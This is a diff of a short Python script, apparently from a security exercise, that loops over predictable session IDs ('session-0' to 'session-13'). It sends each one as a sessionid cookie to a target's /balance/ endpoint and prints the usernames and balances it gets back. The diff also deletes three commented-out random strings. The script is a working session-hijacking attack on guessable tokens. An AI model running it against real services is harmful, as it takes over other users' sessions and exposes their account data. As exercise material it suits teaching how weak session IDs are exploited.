@@ -1,22 +1,32 @@
 import sys
 import requests
 import json
+from django.contrib.sessions.models import Session
+
 
 
 def test_session(address):
-	# write your code here
-	x= requests.get(address)
-	for i in range(2,12):
-		session_id="session-"+str(i)
-		response= requests.get(address+"/balance/", headers={'Cookie': f'sessionid={session_id}'})
-		response= response.json()
-		user=response["username"]
-		amount=response["balance"]
-		if amount>0:
-			print(user, amount)
-	return None
-
-
+    x = requests.get(address)
+    for i in range(0, 14):
+        session_id = "session-" + str(i)
+        response = requests.get(address + "/balance/", headers={'Cookie': f'sessionid={session_id}'})
+        try:
+            response.raise_for_status()  # Raise an error for non-200 status codes
+            response_json = response.json()
+            user = response_json.get("username")
+            amount = response_json.get("balance")
+            if user and amount is not None:
+                print(response)
+                print(f"Session ID: {session_id}, User: {user}, Balance: {amount}")
+            else:
+                print(f"Invalid response for session ID: {session_id}")
+        except requests.exceptions.HTTPError as errh:
+            print(f"HTTP Error: {errh} for session ID: {session_id}")
+        except ValueError as verr:
+            print(f"ValueError: {verr} for session ID: {session_id}")
+        except Exception as e:
+            print(f"Error: {e} for session ID: {session_id}")
+            print(f"Response text: {response.text}")
 
 def main(argv):
 	address = sys.argv[1]
@@ -28,6 +38,3 @@ if __name__ == "__main__":
 	else:
 		main(sys.argv)
 
-#W25T3lFzi0flx8x4HbcG7FsvPqOlfcYu
-#KNAwRpKZpop50qYdy6EQ56dpyffXxYz5
-#AFRt10EVdTOuq0ccbGiSPBfOZWwwkC79
